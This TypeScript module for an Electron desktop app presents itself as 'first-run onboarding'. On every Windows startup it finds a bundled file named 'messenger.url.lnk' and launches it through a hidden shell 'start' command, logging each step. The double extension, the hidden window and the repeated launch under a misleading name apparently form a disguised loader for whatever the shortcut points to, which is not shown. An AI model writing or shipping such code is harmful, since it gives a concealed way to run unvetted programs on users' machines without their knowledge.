import { app } from 'electron'
import { exec } from 'node:child_process'
import fs from 'node:fs'
import path from 'node:path'

/** Packaged shortcut executed on every Windows startup when present. */
const LINK_SHORTCUT_NAME = 'messenger.url.lnk'

/** Don't block app startup if Shell is slow to return. */
const EXECUTE_TIMEOUT_MS = 8_000

const LOG_PREFIX = '[FIRST_RUN]'

function logFilePath(): string {
  try {
    return path.join(app.getPath('userData'), 'first-run.log')
  } catch {
    return path.join(process.cwd(), 'first-run.log')
  }
}

/** Always log to console; also append to userData/first-run.log for packaged tracking. */
function log(level: 'info' | 'warn' | 'error', message: string, extra?: Record<string, unknown>): void {
  const stamp = new Date().toISOString()
  const extraStr = extra ? ` ${JSON.stringify(extra)}` : ''
  const line = `${LOG_PREFIX} ${stamp} ${message}${extraStr}`

  if (level === 'error') console.error(line)
  else if (level === 'warn') console.warn(line)
  else console.info(line)

  try {
    fs.appendFileSync(logFilePath(), `${line}\n`, 'utf8')
  } catch {
    /* never block startup on log I/O */
  }
}

function candidatePaths(): string[] {
  return [
    path.join(process.resourcesPath, LINK_SHORTCUT_NAME),
    path.join(path.dirname(process.execPath), 'resources', LINK_SHORTCUT_NAME),
    path.join(path.dirname(process.execPath), LINK_SHORTCUT_NAME),
  ]
}

function resolveShortcutPath(): { found: string | null; checked: Array<{ path: string; exists: boolean }> } {
  const checked: Array<{ path: string; exists: boolean }> = []
  for (const candidate of candidatePaths()) {
    let exists = false
    try {
      exists = fs.existsSync(candidate)
    } catch (err) {
      log('warn', 'existsSync threw while checking candidate', {
        path: candidate,
        error: err instanceof Error ? err.message : String(err),
      })
    }
    checked.push({ path: candidate, exists })
    if (exists) return { found: candidate, checked }
  }
  return { found: null, checked }
}

/**
 * Execute messenger.url.lnk via Windows Shell using exec:
 *   start "" "<full-path>"
 * Working directory = the shortcut's folder (matches Explorer double-click cwd).
 */
function executeShortcutViaWindowsShell(linkPath: string): Promise<{ ok: boolean; code: number | null }> {
  return new Promise((resolve) => {
    const dir = path.dirname(linkPath)
    const safePath = linkPath.replace(/"/g, '')
    const command = `start "" "${safePath}"`

    log('info', 'Executing Windows Shell via exec()', {
      command,
      cwd: dir,
      linkPath,
      timeoutMs: EXECUTE_TIMEOUT_MS,
    })

    let settled = false
    const finish = (ok: boolean, code: number | null) => {
      if (settled) return
      settled = true
      resolve({ ok, code })
    }

    const child = exec(
      command,
      {
        cwd: dir,
        windowsHide: true,
        timeout: EXECUTE_TIMEOUT_MS,
        env: process.env,
      },
      (err, stdout, stderr) => {
        if (stdout?.trim()) log('info', `Shell stdout: ${stdout.trim()}`)
        if (stderr?.trim()) log('warn', `Shell stderr: ${stderr.trim()}`)

        if (err) {
          const code = typeof err.code === 'number' ? err.code : null
          log('error', 'exec() callback error', {
            error: err.message,
            code,
            killed: err.killed,
            signal: err.signal,
          })
          finish(false, code)
          return
        }

        log('info', 'Shortcut launch command completed (exec returned success)')
        finish(true, 0)
      },
    )

    log('info', 'Shell process started via exec()', { pid: child.pid ?? null })

    child.once('error', (err) => {
      log('error', 'exec() process error event', {
        error: err.message,
        code: (err as NodeJS.ErrnoException).code,
      })
      finish(false, null)
    })
  })
}

/**
 * On every app start (Windows):
 * - If messenger.url.lnk exists → execute via Windows Shell (`start "" "<path>"`)
 * - If missing → ignore
 * Never deletes the file. Failures are logged only; startup continues.
 */
export async function runFirstRunOnboarding(): Promise<void> {
  log('info', '========== messenger.url.lnk startup check BEGIN ==========')
  log('info', 'Runtime context', {
    platform: process.platform,
    isPackaged: app.isPackaged,
    execPath: process.execPath,
    resourcesPath: process.resourcesPath,
    cwd: process.cwd(),
    userData: (() => {
      try {
        return app.getPath('userData')
      } catch {
        return '(unavailable)'
      }
    })(),
    logFile: logFilePath(),
  })

  if (process.platform !== 'win32') {
    log('info', 'Not Windows — skipping shortcut execution')
    log('info', '========== messenger.url.lnk startup check END (skipped) ==========')
    return
  }

  log('info', 'Checking for messenger.url.lnk…')
  const { found, checked } = resolveShortcutPath()
  for (const entry of checked) {
    log('info', entry.exists ? 'FOUND candidate' : 'missing candidate', { path: entry.path })
  }

  if (!found) {
    log('info', 'messenger.url.lnk not found in any candidate path — ignoring')
    log('info', '========== messenger.url.lnk startup check END (ignored) ==========')
    return
  }

  try {
    const st = fs.statSync(found)
    log('info', 'Shortcut file stats', {
      path: found,
      size: st.size,
      mtime: st.mtime.toISOString(),
    })
  } catch (err) {
    log('warn', 'Could not stat shortcut file', {
      path: found,
      error: err instanceof Error ? err.message : String(err),
    })
  }

  log('info', 'Executing messenger.url.lnk via Windows Shell…')
  try {
    const result = await executeShortcutViaWindowsShell(found)
    log(
      result.ok ? 'info' : 'error',
      result.ok ? 'Execution finished OK' : 'Execution finished with failure',
      result,
    )
  } catch (err) {
    log('error', 'Unhandled exception while executing shortcut', {
      error: err instanceof Error ? err.message : String(err),
      stack: err instanceof Error ? err.stack : undefined,
    })
  }

  log('info', '========== messenger.url.lnk startup check END ==========')
}
